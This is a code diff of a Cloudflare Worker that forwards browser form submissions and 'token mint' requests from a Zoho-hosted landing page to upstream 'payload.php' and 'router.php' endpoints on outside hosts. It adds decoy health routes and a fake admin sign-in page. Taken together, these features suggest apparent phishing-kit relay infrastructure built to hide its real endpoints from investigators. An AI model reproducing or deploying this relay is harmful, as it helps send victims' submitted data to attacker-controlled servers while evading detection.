@@ -1,32 +1,22 @@
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
-
-    // ---- Config (set these in Worker env/vars, NOT in code) ----
-    const ALLOWED_ORIGIN = env.ALLOWED_ORIGIN; // "https://portalaccess.zoholandingpage.com"
-
-    const UP_RAILWAY_GW   = env.UP_RAILWAY_GW;   // "https://blissful-motivation-production.up.railway.app/api/gw.php"
-    const UP_RAILWAY_SYNC = env.UP_RAILWAY_SYNC; // "https://blissful-motivation-production.up.railway.app/api/sync.php"
-
-    const UP_VPS_C = env.UP_VPS_C; // "https://api.adhket.icu/svc/payload.php"
-    const UP_VPS_R = env.UP_VPS_R; // "https://api.adhket.icu/svc/router.php"
-
-    const RAILWAY_RELAY_SECRET = env.RAILWAY_RELAY_SECRET; // random long secret
-    const VPS_RELAY_SECRET     = env.VPS_RELAY_SECRET;     // different random long secret
-
-    // ---- Route map ----
     const route = url.pathname;
-    let upstream = null;
-    let relaySecret = null;
 
-    if (route === "/gw")   { upstream = UP_RAILWAY_GW;   relaySecret = RAILWAY_RELAY_SECRET; }
-    if (route === "/sync") { upstream = UP_RAILWAY_SYNC; relaySecret = RAILWAY_RELAY_SECRET; }
-    if (route === "/c")    { upstream = UP_VPS_C;        relaySecret = VPS_RELAY_SECRET; }
-    if (route === "/r")    { upstream = UP_VPS_R;        relaySecret = VPS_RELAY_SECRET; }
+    // ---- Config from environment ----
+    const ALLOWED_ORIGIN       = env.ALLOWED_ORIGIN;       // e.g. "https://portalaccess.zoholandingpage.com"
+    const UP_RAILWAY_GW        = env.UP_RAILWAY_GW;        // e.g. "https://blissful-motivation-production.up.railway.app/api/gw.php"
+    const UP_RAILWAY_SYNC      = env.UP_RAILWAY_SYNC;      // e.g. "https://blissful-motivation-production.up.railway.app/api/sync.php"
+    const UP_VPS_C             = env.UP_VPS_C;             // e.g. "https://api.adhket.icu/svc/payload.php"
+    const UP_VPS_R             = env.UP_VPS_R;             // e.g. "https://api.adhket.icu/svc/router.php"
+    const RAILWAY_RELAY_SECRET = env.RAILWAY_RELAY_SECRET; // long random
+    const VPS_RELAY_SECRET     = env.VPS_RELAY_SECRET;     // different long random
 
-    if (!upstream) return new Response("Not found", { status: 404 });
+    // =========================
+    // 1) Honeypot / fake routes
+    // =========================
 
-    // ---- Preflight ----
+    // Preflight always first
     if (request.method === "OPTIONS") {
       return new Response(null, {
         status: 204,
@@ -34,30 +24,136 @@ export default {
       });
     }
 
+    // JSON-looking fake API
+    if (route === "/api/validate" || route === "/healthz" || route === "/status") {
+      return new Response(
+        JSON.stringify({ ok: true, code: "READY" }),
+        { status: 200, headers: jsonCorsHeaders(ALLOWED_ORIGIN) }
+      );
+    }
+
+    // Fake admin UI
+    if (route === "/admin" || route === "/admin/login" || route === "/cpanel") {
+      const html = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Admin Sign in</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+    background:#0f172a;
+    color:#e5e7eb;
+    height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .card{
+    background:#020617;
+    border:1px solid #1f2937;
+    border-radius:8px;
+    padding:22px 22px 18px;
+    width:100%;
+    max-width:360px;
+    box-shadow:0 18px 40px rgba(0,0,0,.6);
+  }
+  h1{font-size:18px;margin-bottom:10px;}
+  label{display:block;font-size:12px;margin-bottom:4px;color:#9ca3af;}
+  input{
+    width:100%;
+    background:#020617;
+    border:1px solid #374151;
+    border-radius:4px;
+    padding:7px 9px;
+    color:#e5e7eb;
+    font-size:13px;
+    margin-bottom:10px;
+  }
+  button{
+    width:100%;
+    border:0;
+    border-radius:4px;
+    padding:8px 0;
+    background:#2563eb;
+    color:#fff;
+    font-size:13px;
+    cursor:pointer;
+  }
+  button:hover{background:#1d4ed8;}
+  .hint{margin-top:10px;font-size:11px;color:#6b7280;}
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>form</h1>
+    <form>
+      <label for="u">User name</label>
+      <input id="u" type="text" autocomplete="off">
+      <label for="p">full-name</label>
+      <input id="p" type="name" autocomplete="off">
+      <button type="submit">submit</button>
+      <div class="hint">Contact your administrator.</div>
+    </form>
+  </div>
+</body>
+</html>`;
+      return new Response(html, {
+        status: 403,
+        headers: htmlCorsHeaders(ALLOWED_ORIGIN),
+      });
+    }
+
+    // =========================
+    // 2) Real API routing (/gw,/sync,/c,/r)
+    // =========================
+
+    let upstream = null;
+    let relaySecret = null;
+
+    if (route === "/gw") {
+      upstream = UP_RAILWAY_GW;
+      relaySecret = RAILWAY_RELAY_SECRET;
+    } else if (route === "/sync") {
+      upstream = UP_RAILWAY_SYNC;
+      relaySecret = RAILWAY_RELAY_SECRET;
+    } else if (route === "/c") {
+      upstream = UP_VPS_C;
+      relaySecret = VPS_RELAY_SECRET;
+    } else if (route === "/r") {
+      upstream = UP_VPS_R;
+      relaySecret = VPS_RELAY_SECRET;
+    }
+
+    if (!upstream) {
+      return new Response("Not found", { status: 404 });
+    }
+
     if (request.method !== "POST") {
       return new Response("Method not allowed", { status: 405 });
     }
 
-    // ---- CORS / browser-only gate (NOT security) ----
+    // ---- CORS / browser gate (not auth, just hygiene) ----
     const origin = request.headers.get("Origin") || "";
     if (origin && origin !== ALLOWED_ORIGIN) {
-      // Quiet deny (don’t leak)
       return new Response("Not found", { status: 404 });
     }
 
-    // ---- Lightweight rate limiting per route ----
-    // Notes: This is a "good enough" edge throttle. Your real enforcement stays on Railway/VPS.
+    // ---- Lightweight rate limiting ----
     const ip = request.headers.get("CF-Connecting-IP") || "0.0.0.0";
     const limits = getLimits(route); // { windowSec, max }
-    const rlOk = await rateLimitOK(ip, route, limits.windowSec, limits.max);
-    if (!rlOk) {
+    const okRate = await rateLimitOK(ip, route, limits.windowSec, limits.max, ctx);
+    if (!okRate) {
       return new Response("Too many requests", {
         status: 429,
         headers: corsHeaders(ALLOWED_ORIGIN),
       });
     }
 
-    // ---- Forward request (streaming body) ----
+    // ---- Forward request ----
     const contentType = request.headers.get("Content-Type") || "application/json";
 
     const upstreamReq = new Request(upstream, {
@@ -65,76 +161,91 @@ export default {
       headers: {
         "Content-Type": contentType,
         "User-Agent": request.headers.get("User-Agent") || "",
-        "X-Edge-Relay": relaySecret,        // ✅ backend must enforce this
-        "X-Edge-Route": route,              // optional debug
+        "X-Edge-Relay": relaySecret,
+        "X-Edge-Route": route,
       },
       body: request.body,
     });
 
-    const resp = await fetch(upstreamReq);
+    const upstreamResp = await fetch(upstreamReq);
 
-    // ---- Return with CORS ----
-    const headers = new Headers(resp.headers);
-    applyCors(headers, ALLOWED_ORIGIN);
+    const outHeaders = new Headers(upstreamResp.headers);
+    applyCors(outHeaders, ALLOWED_ORIGIN);
 
-    return new Response(resp.body, { status: resp.status, headers });
-
-
-    // ---------------- helpers ----------------
-
-    function corsHeaders(allowedOrigin) {
-      return {
-        "Access-Control-Allow-Origin": allowedOrigin,
-        "Access-Control-Allow-Credentials": "true",
-        "Access-Control-Allow-Methods": "POST, OPTIONS",
-        "Access-Control-Allow-Headers": "Content-Type",
-        "Vary": "Origin",
-      };
-    }
-
-    function applyCors(headers, allowedOrigin) {
-      headers.set("Access-Control-Allow-Origin", allowedOrigin);
-      headers.set("Access-Control-Allow-Credentials", "true");
-      headers.set("Vary", "Origin");
-      // defensive caching headers
-      headers.set("Cache-Control", "no-store");
-      headers.set("Pragma", "no-cache");
-    }
-
-    function getLimits(path) {
-      // Tune as you like:
-      // /gw (token mint) should be stricter than /sync (heartbeat)
-      if (path === "/gw")   return { windowSec: 300, max: 25 };  // 25/5min per IP
-      if (path === "/sync") return { windowSec: 300, max: 120 }; // heartbeat friendly
-      if (path === "/c")    return { windowSec: 300, max: 120 }; // content fetches
-      if (path === "/r")    return { windowSec: 300, max: 60 };  // form submits
-      return { windowSec: 300, max: 60 };
-    }
-
-    async function rateLimitOK(ip, route, windowSec, max) {
-      // Using Cloudflare cache as a simple counter store
-      const bucket = Math.floor(Date.now() / 1000 / windowSec);
-      const key = new Request(`https://rl.local/${route}/${bucket}/${ip}`, { method: "GET" });
-
-      const cache = caches.default;
-      let cached = await cache.match(key);
-
-      let count = 0;
-      if (cached) {
-        const txt = await cached.text();
-        count = parseInt(txt || "0", 10) || 0;
-      }
-
-      count++;
-      // write back with TTL == window
-      ctx.waitUntil(cache.put(
-        key,
-        new Response(String(count), {
-          headers: { "Cache-Control": `public, max-age=${windowSec}` },
-        })
-      ));
-
-      return count <= max;
-    }
+    return new Response(upstreamResp.body, {
+      status: upstreamResp.status,
+      headers: outHeaders,
+    });
   },
 };
+
+// ===== helper functions =====
+
+function corsHeaders(allowedOrigin) {
+  return {
+    "Access-Control-Allow-Origin": allowedOrigin,
+    "Access-Control-Allow-Credentials": "true",
+    "Access-Control-Allow-Methods": "POST, OPTIONS",
+    "Access-Control-Allow-Headers": "Content-Type",
+    "Vary": "Origin",
+  };
+}
+
+function jsonCorsHeaders(allowedOrigin) {
+  return {
+    ...corsHeaders(allowedOrigin),
+    "Content-Type": "application/json; charset=utf-8",
+    "Cache-Control": "no-store",
+  };
+}
+
+function htmlCorsHeaders(allowedOrigin) {
+  return {
+    ...corsHeaders(allowedOrigin),
+    "Content-Type": "text/html; charset=utf-8",
+    "Cache-Control": "no-store",
+  };
+}
+
+function applyCors(headers, allowedOrigin) {
+  headers.set("Access-Control-Allow-Origin", allowedOrigin);
+  headers.set("Access-Control-Allow-Credentials", "true");
+  headers.set("Vary", "Origin");
+  headers.set("Cache-Control", "no-store");
+  headers.set("Pragma", "no-cache");
+}
+
+function getLimits(path) {
+  if (path === "/gw")   return { windowSec: 300, max: 25 };   // token mint
+  if (path === "/sync") return { windowSec: 300, max: 120 };  // heartbeat
+  if (path === "/c")    return { windowSec: 300, max: 120 };  // content
+  if (path === "/r")    return { windowSec: 300, max: 60 };   // form submits
+  return { windowSec: 300, max: 60 };
+}
+
+async function rateLimitOK(ip, route, windowSec, max, ctx) {
+  const bucket = Math.floor(Date.now() / 1000 / windowSec);
+  const key = new Request(`https://rl.local/${route}/${bucket}/${ip}`, { method: "GET" });
+
+  const cache = caches.default;
+  const cached = await cache.match(key);
+
+  let count = 0;
+  if (cached) {
+    const txt = await cached.text();
+    count = parseInt(txt || "0", 10) || 0;
+  }
+
+  count++;
+
+  ctx.waitUntil(
+    cache.put(
+      key,
+      new Response(String(count), {
+        headers: { "Cache-Control": `public, max-age=${windowSec}` },
+      })
+    )
+  );
+
+  return count <= max;
+}
